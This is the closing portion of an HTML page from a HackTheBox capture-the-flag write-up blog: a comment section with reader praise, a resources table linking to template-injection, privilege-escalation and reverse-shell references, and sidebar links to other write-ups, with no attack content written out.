                                </p>
                                <p>
                                    --Auther <code
                                    class="language-plaintext highlighter-rouge">DEDSEC</code>
                                </p>
                                <blockquote>
                                    <p>
                                        If you like the <code
                                        class="language-plaintext highlighter-rouge">writeup</code> plz leave a comment it's <code
                                        class="language-plaintext highlighter-rouge">motivate</code> me to  upload something new to my <code class="language-plaintext highlighter-rouge">blog</code>
                                    </p>
                                </blockquote>

<div class="container">
        <div class="row justify-content-center mb-2">
            <div class="col-lg-10 bg-dark rounded mt-2">
                <form action="/Doctor/index.php" method="POST" class="p-2">
                    <div class="form-group">
                        <input type="text" name="name" class="form-control rounded-0" placeholder="Enter Your Name" autocomplete="off" required>
                    </div>
                    <div class="form-group">
                        <textarea name="comment" class="form-control rounded-0" placeholder="Write Your Comment here" required></textarea>
                    </div>
                    <div class="form-group">
                        <input type="submit" name="submit" class="btn btn-primary rounded-0" value="Post Comment">
                        <h5 class="float-right text-success p-2"></h5>
                    </div>
                </form>
            </div>
        </div>
        <div class="row justify-content-center mb-2">
            <div class="col-lg-10 rounded bg-dark p-3">
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : DEDSEC</span>
                        <span class="float-right" style="color: white;">On : 2020-09-29</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">It&apos;s not recorded it&apos;s made by custom</p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : Anonymous</span>
                        <span class="float-right" style="color: white;">On : 2020-09-29</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">Tool for recording terminal Pwned? </p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : Anonymous</span>
                        <span class="float-right" style="color: white;">On : 2020-09-29</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">Amazing write up. It’s to the point. </p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : DEDSEC</span>
                        <span class="float-right" style="color: white;">On : 2020-09-28</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">Thank you everyone who support me😇</p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : 1337</span>
                        <span class="float-right" style="color: white;">On : 2020-09-28</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">nice writeup bro , great </p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : Eevee</span>
                        <span class="float-right" style="color: white;">On : 2020-09-28</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">So cool writeup</p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : Khalid </span>
                        <span class="float-right" style="color: white;">On : 2020-09-28</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">You helps me a lot 
keep going </p>
                    </div>
                </div>
                                <div class="card mb-2 border-secondary">
                    <div class="card-header bg-secondary py-1 text-light">
                        <span style="color: black;">Posted By : kartik</span>
                        <span class="float-right" style="color: white;">On : 2020-09-28</span>
                    </div>
                    <div class="card-body py-2">
                        <p class="card-text" style="color: black;">your writeup is too good bro i like it so much</p>
                    </div>
                </div>
                            </div>
        </div>
    </div>


                                <h1 id="resources">Resources</h1>
                                <table>
                                    <thead>
                                        <tr>
                                            <th>Topic
                                            <th>
                                                Url
                                    <tbody>
                                        <tr>
                                            <td>Templates Injections
                                            <td>
                                                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
                                                    target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server....</a>
                                        <tr>
                                            <td>LinPEAS
                                            <td>
                                                <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"
                                                    target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>
                                        <tr>
                                            <td>Shell
                                            <td>
                                                <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
                                                    target="_blank">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
                                </table>
                        </div>
                        <div class="post-tail-wrapper text-muted">
                            <div>
                                Updated
                                <span class="timeago lastmod" data-toggle="tooltip" data-placement="top"
                                    title="Thu, Sept 28, 2020, 12:00 AM +0000">
                                    sept 28, 2020 <i class="unloaded">2020-9-28T00:00:00+00:00</i>
                                </span>
                            </div>
                            <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
                                <div class="share-wrapper">
                                    <span class="share-label ml-1 mr-1">Share</span>
                                    <span class="share-icon">
                                        <a href="#"
                                            data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank">
                                            <i class="fa-fw fab fa-twitter mr-1"></i>
                                        </a>
                                        <a href="#"
                                            data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank">
                                            <i class="fa-fw fab fa-facebook-square mr-1"></i>
                                        </a>
                                        <a href="#"
                                            data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank">
                                            <i class="fa-fw fab fa-telegram mr-1"></i>
                                        </a>
                                        <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()"
                                            data-toggle="tooltip" data-placement="top" title="Copy link"></i>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
                <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
                    <div class="access">
                        <div id="access-lastmod" class="post mb-4">
                            <h3 data-toc-skip>Recent Update</h3>
                            <ul class="post-content pl-0 pb-1 ml-1 mt-2">
                                <li>
                                    <a href="#">Hackthebox Compromised writeup</a>
                                </li>
                                <li>
                                    <a href="../sneakymailer/">Hackthebox Sneakymailer writeup</a>
                                </li>
                                <li>
                                    <a href="../omni/">HackTheBox omni writeup</a>
                                </li>
                                <li>
                                    <a href="../auth2.php">Hackthebox Feline writeup</a>
                                </li>
                                <li>
                                    <a href="../auth3.php">Hackthebox Passage writeup</a>
                                </li>
                            </ul>
                        </div>
                        <div id="access-tags">
                            <h3 data-toc-skip>Trending Tags</h3>
                            <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
                                <a class="post-tag"
                                    href="https://medium.com/@scottc130/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1"
                                    target="_blank">wfuzz</a>
                                <a class="post-tag" href="https://www.varonis.com/blog/john-the-ripper/"
                                    target="_blank">john</a>
                                <a class="post-tag" href="https://www.hackthebox.eu/" target="_blank">hackthebox</a>
                                <a class="post-tag" href="https://portswigger.net/web-security/ssrf"
                                    target="_blank">ssrf</a>
                                <a class="post-tag" href="https://portswigger.net/web-security/sql-injection"
                                    target="_blank">sql injection</a>
                                <a class="post-tag"
                                    href="https://www.tecmint.com/ssh-passwordless-login-using-ssh-keygen-in-5-easy-steps/"
                                    target="_blank">ssh-keygen</a>
                                <a class="post-tag" href="https://tools.kali.org/information-gathering/smbmap"
                                    target="_blank">smbmap</a>
                                <a class="post-tag"
                                    href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"
                                    target="_blank">secretdump</a>
                                <a class="post-tag"
                                    href="https://hacknpentest.com/mimikatz-windows-tutorial-beginners-guide-part-1/"
                                    target="_blank">mimikatz</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
                    <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                        <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License -->
                        <div class="post-navigation d-flex justify-content-between">
                            <a href="../sneakymailer/" class="btn btn-outline-primary">
                                <p>Hackthebox Sneakymailer writeup</p>
                            </a>
                            <a href="../auth3.php" class="btn btn-outline-primary">
                                <p>Hackthebox Passage writeup</p>
                            </a>
                        </div>
                        <script src="/assets/lib/jquery.disqusloader.min.js"></script>
                    </div>
                        <script src="/assets/lib/jquery.disqusloader.min.js"></script>
                    </div>
                </div>
            </div>
            <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
            <script type="text/javascript">
                const observer = lozad();
                observer.observe();
            </script>
            <footer class="d-flex w-100 justify-content-center">
                <div class="d-flex justify-content-between align-items-center">
                    <div class="footer-left">
                        <script src="https://www.hackthebox.eu/badge/262485"></script>
                        </p>
                    </div>
                    <p class="mb-0">
                        © 2020 <a href="https://www.facebook.com/dedsecinfoServices/" target="_blanck">DedInfoSec</a>
                        . <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span>
                        <script>
                            (function (i, s, o, g, r, a, m) {
                                i['GoogleAnalyticsObject'] = r;
                                i[r] = i[r] || function () {
                                    (i[r].q = i[r].q || []).push(arguments)
                                }
                                    ,
                                    i[r].l = 1 * new Date();
                                a = s.createElement(o),
                                    m = s.getElementsByTagName(o)[0];
                                a.async = 1;
                                a.src = g;
                                m.parentNode.insertBefore(a, m)
                            }
                            )(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
                            ga('create', 'UA-157514490-1', 'auto');
                            ga('send', 'pageview');
                        </script>
            </footer>
        </div>
</body>
